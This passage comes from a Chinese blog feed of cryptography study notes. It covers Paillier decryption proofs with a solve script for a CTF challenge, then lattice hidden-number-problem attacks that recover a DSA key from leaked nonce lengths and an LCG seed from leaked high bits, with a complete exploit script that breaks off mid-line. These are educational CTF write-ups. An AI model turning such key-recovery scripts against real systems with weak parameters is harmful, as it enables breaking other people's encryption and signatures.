$L(g^{mλ} \cdot r^{nλ} \pmod{n^2})\cdot L(g^λ \pmod{n^2})^{-1} \pmod{n}$ =&gt; $mk_g\cdot k_g^{-1} \equiv m \pmod n$</p><p>证毕</p><h4 id="The-second-pattern"><a href="#The-second-pattern" class="headerlink" title="The second pattern"></a>The second pattern</h4><p>由 $L(c^λ \pmod{n^2} \cdot μ) \pmod{n}$</p><p>有 $L(g^{mλ}\cdot r^{nλ} \pmod{n^2} \cdot μ) \pmod{n}$  ①</p><p>其中$λ = (p-1)*(q-1)， μ = φ(n)^{-1} \pmod{n}$</p><p>∵$r^{nλ} = r^{n(p-1) \cdot (q-1)} = r^{φ(n^2)}$</p><p>由欧拉定理：$r^{φ(n^2)} \equiv 1 \pmod{n^2}$</p><p>①式 =&gt; $L(g^{mλ} \pmod{n^2} \cdot μ) \pmod{n}$  ②</p><p>∵$g = n+1$</p><p>∴$g^{mλ} = (1+n)^{mλ} \equiv nmλ+1 \pmod{n^2}$</p><p>②式=&gt; $L((nmλ+1) \cdot μ) \pmod{n}$ </p><p>=&gt; $ \frac{(nmλ+1)-1}{n} \cdot μ \pmod{n}$ </p><p>=&gt;$(mλ \cdot μ) \pmod{n}$ ③</p><p>∵$λ = φ(n)，μ = φ(n)^{-1} \pmod{n}$ </p><p>∴③式： $(mλ \cdot μ) \equiv m\pmod{n}$</p><p>证毕</p><h2 id="DASCTF四月月赛-not-RSA"><a href="#DASCTF四月月赛-not-RSA" class="headerlink" title="DASCTF四月月赛 not RSA"></a>DASCTF四月月赛 not RSA</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number import getPrime as bytes_to_long</span><br><span class="line"><span class="keyword">from</span><span class="built_in"> secret </span>import flag,p,q</span><br><span class="line"><span class="keyword">from</span> sympy import isprime,nextprime</span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line"><span class="attribute">m</span>=bytes_to_long(flag)</span><br><span class="line"><span class="attribute">n</span>=p*q</span><br><span class="line"><span class="attribute">g</span>=n+1</span><br><span class="line"><span class="attribute">r</span>=random.randint(1,n)</span><br><span class="line"></span><br><span class="line">c=(pow(g,m,n*n)*pow(r,n,n*n))%(n*n)</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">print</span> <span class="string">"c=%d"</span>%(c)</span><br><span class="line"><span class="builtin-name">print</span> <span class="string">"n=%d"</span>%(n)</span><br></pre></td></tr></table></figure><p>可以看到，这一题就是用的paillier cryptosystem，且参数用的是上文中的The second pattern</p><p>但是我们计算$λ = φ(n) = (p-1)\cdot (q-1)$ ，需要用到p和q</p><p>这里我们直接上yafu分解n发现可以成功分解，原因是p与q其实非常接近，所以其实直接对n开根然后再在附近寻找素数就能找到p、q了。</p><p>所以构造解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes,inverse</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> nextprime</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">L</span><span class="params">(x,n)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (x<span class="number">-1</span>)/n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c=</span><br><span class="line">n=</span><br><span class="line"></span><br><span class="line"><span class="comment">#factor(n)</span></span><br><span class="line">a = iroot(n,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">p = nextprime(a)</span><br><span class="line">q = n//p</span><br><span class="line"><span class="keyword">assert</span> p*q == n</span><br><span class="line"></span><br><span class="line"><span class="comment">#根据解密公式，计算所需私钥对（λ，μ）</span></span><br><span class="line">Lambda=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">miu=inverse(Lambda,n*n)</span><br><span class="line">m=(L(pow(c,Lambda,n**<span class="number">2</span>),n)*miu)%n</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> long_to_bytes(m)</span><br></pre></td></tr></table></figure><h2 id="Homomorphic-properties"><a href="#Homomorphic-properties" class="headerlink" title="Homomorphic properties"></a>Homomorphic properties</h2><h3 id="Homomorphic-addition-of-plaintexts"><a href="#Homomorphic-addition-of-plaintexts" class="headerlink" title="Homomorphic addition of plaintexts"></a>Homomorphic addition of plaintexts</h3><p>设D为解密函数，E为加密函数</p><p>即：$D(E(m_1, r_1)\cdot E(m_2,r_2) \pmod {n^2})≡ m_1+m_2 \pmod n$</p><h4 id="proof"><a href="#proof" class="headerlink" title="proof"></a>proof</h4><p>$C = (g^{m_1}) \cdot (r_1^n) \cdot (g^{m_2}) \cdot (r_2^n) \pmod {n^2} $</p><p>&emsp;$= g^{m_1+m_2}\cdot (r_1\cdot r_2)^n \pmod {n^2}$</p><p>首先我们可以将$m_1+m_2$看作一个整体$M$，然后由于$r_1、r_2$是随机选的，所以$r_1\cdot r_2$可以看作一个整体$R$</p><p>故$C = g^M \cdot R^n \pmod {n^2}$</p><p>由于$gcd(r_1,n) = 1; gcd(r_2,n) = 1； =&gt; gcd(r_1\cdot r_2, n) = 1$，故$R$符合要求</p><p>所以$D(C) = M ≡ m_1 + m_2 \pmod n$</p><h3 id="Homomorphic-multiplication-of-plaintexts"><a href="#Homomorphic-multiplication-of-plaintexts" class="headerlink" title="Homomorphic multiplication of plaintexts"></a>Homomorphic multiplication of plaintexts</h3><p>设D为解密函数，E为加密函数</p><p>即：$D(E(m_1, r_1)^k \pmod {n^2})≡ km_1 \pmod n$</p><h4 id="proof-1"><a href="#proof-1" class="headerlink" title="proof"></a>proof</h4><p>$C = (g^{m_1}) \cdot (r_1^n)^k\pmod {n^2} $</p><p>&emsp;$=(g^{km_1}\cdot (r_1^{kn} )\pmod {n^2}$</p><p>首先我们可以将$km_1$看作一个整体$M$，然后由于$r_1$是随机选的，所以$r_1^k$可以看作一个整体R，</p><p>故$C = g^M \cdot  R^n \pmod {n^2}$</p><p>由于$gcd(r_1,n) = 1 =&gt; gcd(r_1^k, n) = 1$，故$R$符合要求</p><p>所以$D(C) = M ≡ km_1 \pmod n$</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://en.wikipedia.org/wiki/Paillier_cryptosystem" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Paillier_cryptosystem</a></p>]]></content>
      
      
      <categories>
          
          <category> 密码小屋 </category>
          
          <category> Paillier </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Paillier </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学学习笔记 之 HNP</title>
      <link href="/2020/05/12/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8BHNP/"/>
      <url>/2020/05/12/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8BHNP/</url>
      
        <content type="html"><![CDATA[<h1 id="浅尝Lattice-之-HNP"><a href="#浅尝Lattice-之-HNP" class="headerlink" title="浅尝Lattice 之 HNP"></a>浅尝Lattice 之 HNP</h1><p>首发于<a href="https://www.anquanke.com/post/id/204846" target="_blank" rel="noopener">安全客</a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp;格密码是一类备受关注的抗量子计算攻击的公钥密码体制。而格理论也使许多现代公钥密码RSA、DSA等体系受到影响。这篇文章主要从两道CTF题目来学习格密码中的HNP(Hidden number problem）。</p><h2 id="Lattice"><a href="#Lattice" class="headerlink" title="Lattice"></a>Lattice</h2><p>&emsp;&emsp;首先谈谈个人对Lattice的理解叭。个人觉得，Latiice就是由若干线性无关的向量组成的一个向量空间，在这个空间中，向量彼此之间可以进行相应的加、减运算。向量也可以乘以某个系数，但这个系数仅限于整数，因而形成了布满整个空间的格点。在格中的计算问题主要包括两种，即SVP(the Shortest Vector Problem of lattice)和CVP(the Closest Vector Problem)，然后个人认为，CVP可以给Latiice加上一个维度后变成SVP，继而可以用LLL算法来进行规约从而找到最短向量。</p><h2 id="XCTF2020-高校战役-NHP"><a href="#XCTF2020-高校战役-NHP" class="headerlink" title="XCTF2020-高校战役-NHP"></a>XCTF2020-高校战役-NHP</h2><p><a href="https://mega.nz/file/efAzRabC#ZxXtUbcHwAA7jpcU0H6V7rAMRfiS_rboH9H9ZN9S2-U" target="_blank" rel="noopener">题目附件</a></p><h3 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h3><p>题目用的是DSA公钥密码签名系统。</p><p>题目提供签名函数：用户以用户名注册，服务端返回签名，<strong>并提供所用临时密钥的bit长度</strong></p><p>我们需要以admin的身份登陆来获取flag，但是服务端不会给admin签名</p><h3 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h3><p>根据题目流程，显然，我们要利用临时密钥的bit长度来获取私钥，从而获得admin的签名</p><p>其中，我们知道的信息全局公钥p, q, g，服务端公钥y , 每轮签名使用的r, s, 以及我们可控的H(x)，x即为用户名，Hash函数这里用的是sha256</p><h4 id="step1-公式转化"><a href="#step1-公式转化" class="headerlink" title="step1-公式转化"></a>step1-公式转化</h4><p>由DSA签名中各参数的关系</p><p>$r \equiv g^k \pmod{q}$<br>$s \equiv k^{-1}(H(m) + xr) \pmod{q}$</p><p>可得每轮临时密钥与签名、明文的关系</p><p>$k_i \equiv  s_i^{-1}r_i \cdot x + s_i^{-1}H(m) \pmod{q} $<br>$k_i \equiv A_i x + B_i \pmod{q} $<br>$k_i = A_i x + B_i + l_i q$</p><p>其中$k_i$就是每次使用的临时密钥</p><p>化简后的式子中的$A_i,B_i$均可由已知信息计算</p><h4 id="step2-构造Lattice"><a href="#step2-构造Lattice" class="headerlink" title="step2-构造Lattice"></a>step2-构造Lattice</h4><p>对于上式中的$k_i$，我们仅仅知道它的bit_ength，bit_ength泄露了什么信息呢？</p><p>当我们知道一个数的bit_ength时，我们能确定这个数的大小范围，</p><p>比如一个数的bit_ength是500时，我们能确定这个数大小落在$(2^{499}-1,2^{500}-1]$</p><p>所以我们知道这个数的MSB位为2^499</p><p>这等价于，我们知道了临时密钥的一个大概的值，我们设其为$K$</p><p>然后我们构造Lattice</p><p>$M =<br>\begin{bmatrix}<br>q  &amp;   &amp;      &amp;    &amp;   &amp;   &amp; \newline<br>&amp; q &amp;      &amp;    &amp;   &amp;   &amp; \newline<br>&amp;   &amp;\ddots&amp;    &amp;   &amp;   &amp; \newline<br>&amp;   &amp;      &amp; q  &amp;   &amp;   &amp; \newline<br>A_1&amp;A_2&amp;\dots &amp; A_t&amp;K/q&amp;   &amp; \newline<br>B_1&amp;B_2&amp;\dots &amp; B_t&amp;   &amp; K &amp; \newline<br>\end{bmatrix}$</p><p>然后这里就会存在一个向量        $v =<br>\begin{bmatrix}<br>l_1 &amp; l_2 &amp; \cdots &amp; l_t &amp; x &amp; 1<br>\end{bmatrix}$</p><p>使得</p><p>$vM =<br>\begin{bmatrix}<br>l_1 &amp; l_2 &amp; \cdots &amp; l_t &amp; x &amp; 1<br>\end{bmatrix}<br>\begin{bmatrix}<br>q  &amp;   &amp;      &amp;    &amp;   &amp;   &amp; \newline<br>&amp; q &amp;      &amp;    &amp;   &amp;   &amp; \newline<br>&amp;   &amp;\ddots&amp;    &amp;   &amp;   &amp; \newline<br>&amp;   &amp;      &amp; q  &amp;   &amp;   &amp; \newline<br>A_1&amp;A_2&amp;\dots &amp; A_t&amp;K/q&amp;   &amp; \newline<br>B_1&amp;B_2&amp;\dots &amp; B_t&amp;   &amp; K &amp; \newline<br>\end{bmatrix} = \begin{bmatrix}<br>k_1 &amp;<br>k_2 &amp;<br>\cdots &amp;<br>k_t  &amp;<br>Kx/q &amp;<br>K<br>\end{bmatrix}<br>= v_k$</p><p>其中向量$v$中的x即为我们的私钥，</p><h4 id="step3-LLL"><a href="#step3-LLL" class="headerlink" title="step3-LLL"></a>step3-LLL</h4><p>解决格密码的问题LLL算法的运用总是必不可少的，可是这里我们该如何利用LLL算法去找到向量$v_k$呢？</p><p>如果我们的$v_k$的长度在格中很小，我们利用LLL就很可能将其找出。所以，我们需要与服务端交互，然后收集当$k_i$的bit_length比较小的情况时的相关数据。比如：我们知道q的bit_length为128，那我们可以找bit_legnth为122的$k_i$，然后我们还需要一定的数据量，这样能提高利用LLL算法找到这个短向量的概率，并且，上述格中$K/q, K$的构造也是为了让$v_k$中的每一项的长度都差不多，这样也有利于找到$v_k$，参考这一篇<a href="https://holocircuit.github.io/2019/01/08/unofficial.html" target="_blank" rel="noopener">文章</a>中的<img src="https://i.loli.net/2020/05/09/7NJvL2DSsXwHEnr.png" alt></p><p>参考祥哥博客的这篇<a href="http://blog.soreatu.com/posts/intended-solution-to-nhp-in-gxzyctf-2020/" target="_blank" rel="noopener">出题文章</a>，另外感谢祥哥的解惑。</p><h2 id="NPUCTF2020-babyLCG"><a href="#NPUCTF2020-babyLCG" class="headerlink" title="NPUCTF2020-babyLCG"></a>NPUCTF2020-babyLCG</h2><p>题目附件可以在<a href="https://buuoj.cn/challenges#[NPUCTF2020]babyLCG" target="_blank" rel="noopener">BUUOJ</a>下载</p><h3 id="题目流程"><a href="#题目流程" class="headerlink" title="题目流程"></a>题目流程</h3><ol><li>初始化一个LCG加密类，用到随机参数a, b, m, seed，其中a, b, m，均在附件给出</li><li>生成20个128位的随机数，但是只给出每个数的高64位</li><li>再生成三个随机数，用AES加密加密flag，key由前两个随机数组成，分别取第一个随机数和第二个随机数的高64位拼起来，iv由第三个随机数组成</li></ol><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>从题目流程来看，我们目的只有一个，恢复seed。</p><h4 id="step1-公式转化-1"><a href="#step1-公式转化-1" class="headerlink" title="step1-公式转化"></a>step1-公式转化</h4><p>LCG生成随机数的公式为：$s_{i+1} = a*s_i+b\pmod{m}$</p><p>但是这一题，我们只知道$s_1$ 到$s_{20}$的高64位，所以我们将$s_i$分为h、l高低位两部分，其中$h_i$已知。所以有</p><p>$(h_{2}+l_{2}) \equiv a*(h_1 + l_1 )+b\pmod{m}$</p><p>$l_{2} \equiv a * l _ 1+a * h _ 1+b-h _ {2}\pmod{m}$</p><p>$l_{2} \equiv A _ 1 * l _ 1+B _ 1\pmod{m}$ 【$设A _1 = a; B _ 1 = a * h _ 1+b-h _ {2}$】</p><p>$l _ {3} \equiv a * l _ {2}+a * h _ {2}+b-h _ {3}\pmod{m}$</p><p>$l _ {3} \equiv a * A_1 * l _ {1}+a * B_1+a * h_{2}+b-h _ {3}\pmod{m}$</p><p>$l _ {3} \equiv A _ {2} * l _ {1}+B _ {2}\pmod{m}$【$设A _ {2} = a * A _ 1; B _ {2} = a * B _ 1+a * h _ {2}+b-h _ {3}$】</p><p>…</p><p>这里，我们通过公式的变形，可以将原来式子$s _ {i+1} = a*s _ i + b \pmod{m}$</p><p>中$s_{i+1}和s_{i}$的关系转变为$l_{i+1}和l_{i}$的关系。当然，原系数a、b的意义也发生了对应转变。</p><p>这里给出生成新A 和B 的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">b=<span class="number">153582801876235638173762045261195852087</span></span><br><span class="line">a=<span class="number">107763262682494809191803026213015101802</span></span><br><span class="line">m=<span class="number">226649634126248141841388712969771891297</span></span><br><span class="line"></span><br><span class="line">h = [<span class="number">0</span>,<span class="number">7800489346663478448</span>,<span class="number">11267068470666042741</span>,<span class="number">5820429484185778982</span>,<span class="number">6151953690371151688</span>,<span class="number">548598048162918265</span>,<span class="number">1586400863715808041</span>,<span class="number">7464677042285115264</span>,<span class="number">4702115170280353188</span>,<span class="number">5123967912274624410</span>,<span class="number">8517471683845309964</span>,<span class="number">2106353633794059980</span>,<span class="number">11042210261466318284</span>,<span class="number">4280340333946566776</span>,<span class="number">6859855443227901284</span>,<span class="number">3149000387344084971</span>,<span class="number">7055653494757088867</span>,<span class="number">5378774397517873605</span>,<span class="number">8265548624197463024</span>,<span class="number">2898083382910841577</span>,<span class="number">4927088585601943730</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(h)):</span><br><span class="line">h[i] &lt;&lt;= <span class="number">64</span></span><br><span class="line">A = [<span class="number">1</span>]</span><br><span class="line">B = [<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(h)<span class="number">-1</span>):</span><br><span class="line">A.append(a*A[i<span class="number">-1</span>] % m)</span><br><span class="line">B.append((a*B[i<span class="number">-1</span>]+a*h[i]+b-h[i+<span class="number">1</span>]) % m)</span><br><span class="line">print(A[<span class="number">1</span>:])</span><br><span class="line">print(B[<span class="number">1</span>:])</span><br></pre></td></tr></table></figure><h4 id="step2-构造Lattice-1"><a href="#step2-构造Lattice-1" class="headerlink" title="step2-构造Lattice"></a>step2-构造Lattice</h4><p>现在我们二十条与 $l_1$ 相关的方程组了。即</p><p>$l_{i+1} \equiv A_i*l_1+B_i\pmod{m}$</p><p>$l_{i+1} = A_i*l_1+B_i+k_im$</p><p>且对于 $l_i$ 我们真的一无所知么？我们其实知道 $l_i$ 是小于2^64的，即 $l$ 最大为64bit。这样与前面一道题就很类似了。</p><p>于是我们构造Lattice</p><p>$M =<br>\begin{bmatrix}<br>m  &amp;   &amp;      &amp;    &amp;   &amp;   \newline<br>&amp; m &amp;      &amp;    &amp;   &amp;   \newline<br>&amp;   &amp;\ddots&amp;    &amp;   &amp;   \newline<br>&amp;   &amp;      &amp; m  &amp;   &amp;   \newline<br>A_1&amp;A_2&amp;\dots &amp; A_{19}&amp;1&amp;   \newline<br>B_1&amp;B_2&amp;\dots &amp; B_{19}&amp;0&amp; 2^{64}\newline<br>\end{bmatrix}$</p><p>然后这里就会存在一个向量        $v =<br>\begin{bmatrix}<br>k_1 &amp; k_2 &amp; \cdots &amp; k_{19} &amp; l_1 &amp; 1<br>\end{bmatrix}$ 使得</p><p>$vM =<br>\begin{bmatrix}<br>k_1 &amp; k_2 &amp; \cdots &amp; k_{19} &amp; l_1 &amp; 1<br>\end{bmatrix}<br>\begin{bmatrix}<br>m  &amp;   &amp;      &amp;    &amp;   &amp;   \newline<br>&amp; m &amp;      &amp;    &amp;   &amp;   \newline<br>&amp;   &amp;\ddots&amp;    &amp;   &amp;   \newline<br>&amp;   &amp;      &amp; m  &amp;   &amp;   \newline<br>A_1&amp;A_2&amp;\dots &amp; A_{19}&amp;1&amp;   \newline<br>B_1&amp;B_2&amp;\dots &amp; B_{19}&amp;0&amp; 2^{64} \newline<br>\end{bmatrix} = \begin{bmatrix}<br>l_2 &amp;<br>l_3 &amp;<br>\cdots &amp;<br>l_{20}  &amp;<br>l_1 &amp;<br>2^{64}<br>\end{bmatrix}<br>= v_l$</p><p>其中$l_1$即为$s_1$的低位，拼上其高位，在利用a, b, m就能恢复seed了</p><h4 id="step3-LLL-1"><a href="#step3-LLL-1" class="headerlink" title="step3-LLL"></a>step3-LLL</h4><p>&emsp;&emsp;这里我们的$v_l$向量每一位都只有约64bit，显然，它是整个格中比较短的向量了，且我们一共有19组数据，那么直接对这个Lattice M运用LLL算法就可以找到$v_l$了。（格中参数$2^{64}$的选取道理与上面一致）</p><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">#sage</span></span><br><span class="line"><span class="string">b=153582801876235638173762045261195852087</span></span><br><span class="line"><span class="string">a=107763262682494809191803026213015101802</span></span><br><span class="line"><span class="string">m=226649634126248141841388712969771891297</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">h = [0,7800489346663478448,11267068470666042741,5820429484185778982,6151953690371151688,548598048162918265,1586400863715808041,7464677042285115264,4702115170280353188,5123967912274624410,8517471683845309964,2106353633794059980,11042210261466318284,4280340333946566776,6859855443227901284,3149000387344084971,7055653494757088867,5378774397517873605,8265548624197463024,2898083382910841577,4927088585601943730]</span></span><br><span class="line"><span class="string">for i in range(len(h)):</span></span><br><span class="line"><span class="string">h[i] &lt;&lt;= 64</span></span><br><span class="line"><span class="string">A = [1]</span></span><br><span class="line"><span class="string">B = [0]</span></span><br><span class="line"><span class="string">for i in range(1, len(h)-1):</span></span><br><span class="line"><span class="string">A.append(a*A[i-1] % m)</span></span><br><span class="line"><span class="string">B.append((a*B[i-1]+a*h[i]+b-h[i+1]) % m)</span></span><br><span class="line"><span class="string">A = A[1:]</span></span><br><span class="line"><span class="string">B = B[1:]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">M = matrix(ZZ, 21, 21)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for i in range(19):</span></span><br><span class="line"><span class="string">    M[i, i] = m</span></span><br><span class="line"><span class="string">    M[19, i] = A[i]</span></span><br><span class="line"><span class="string">    M[20, i] = B[i]</span></span><br><span class="line"><span class="string">    M[i, 19] = M[i, 20] = 0</span></span><br><span class="line"><span class="string">M[19, 19] =  1</span></span><br><span class="line"><span class="string">M[20, 20] = 2^64</span></span><br><span class="line"><span class="string">M[19, 20]= 0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#print(B)</span></span><br><span class="line"><span class="string">vl = M.LLL()[0]</span></span><br><span class="line"><span class="string">l1 = vl[-2]</span></span><br><span class="line"><span class="string">h1 = h[1]</span></span><br><span class="line"><span class="string">s1 = l1+h1</span></span><br><span class="line"><span class="string">#s1 = a*seed+b %m</span></span><br><span class="line"><span class="string">seed = ((s1 - b)*inverse_mod(a,m))%m</span></span><br><span class="line"><span class="string">print(seed)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment">#python</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LCG</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, bit_length)</span>:</span></span><br><span class="line">b = <span class="number">153582801876235638173762045261195852087</span></span><br><span class="line">a = <span class="number">107763262682494809191803026213015101802</span></span><br><span class="line">m = <span class="number">226649634126248141841388712969771891297</span></span><br><span class="line">seed = <span class="number">73991202721494681711496408225724067994</span></span><br><span class="line">self._key = &#123;<span class="string">'a'</span>:a, <span class="string">'b'</span>:b, <span class="string">'m'</span>:m&#125;</span><br><span class="line">self._state = seed</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">next</span><span class="params">(self)</span>:</span></span><br><span class="line">self._state = (self._key[<span class="string">'a'</span>] * self._state + self._key[<span class="string">'b'</span>]) % self._key[<span class="string">'m'</span>]</span><br><span class="line"><span class="keyword">return</span> self._state</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">export_key</span><span class="params">(self)</span>:</span></span><br><span class="line"><span class="keyword">return</span> self._key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_lcg</span><span class="params">()</span>:</span></span><br><span class="line">    rand_iter = LCG(<span class="number">128</span>)</span><br><span class="line">    key = rand_iter.export_key()</span><br><span class="line">    f = open(<span class="string">"key"</span>, <span class="string">"w"</span>)</span><br><span class="line">    f.write(str(key))</span><br><span class="line">    <span class="keyword">return</span> rand_iter</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_data</span><span class="params">(rand_iter)</span>:</span></span><br><span class="line">    f = open(<span class="string">"old"</span>, <span class="string">"w"</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">        f.write(str(rand_iter.next() &gt;&gt; <span class="number">64</span>) + <span class="string">"\n"</span>)</span><br><span class="line">    <span class="keyword">return</span> rand_iter</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(rand_iter)</span>:</span></span><br><span class="line">    f = open(<span class="string">"ct"</span>, <span class="string">"wb"</span>)</span><br><span class="line">    key = rand_iter.next() &gt;&gt; <span class="number">64</span></span><br><span class="line">    key = (key &lt;&lt; <span class="number">64</span>) + (rand_iter.next() &gt;&gt; <span class="number">64</span>)</span><br><span class="line">    key = long_to_bytes(key).ljust(<span class="number">16</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">    iv = long_to_bytes(rand_iter.next()).ljust(<span class="number">16</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    pt = flag + (<span class="number">16</span> - len(flag) % <span class="number">16</span>) * chr(<span class="number">16</span> - len(flag) % <span class="number">16</span>)</span><br><span class="line">    ct = cipher.encrypt(pt.encode())</span><br><span class="line">    f.write(ct)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(rand_iter)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"ct"</span>, <span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = f.read()</span><br><span class="line"></span><br><span class="line">    key = rand_iter.next() &gt;&gt; <span class="number">64</span></span><br><span class="line">    key = (key &lt;&lt; <span class="number">64</span>) + (rand_iter.next() &gt;&gt; <span class="number">64</span>)</span><br><span class="line">    key = long_to_bytes(key).ljust(<span class="number">16</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">    iv = long_to_bytes(rand_iter.next()).ljust(<span class="number">16</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span 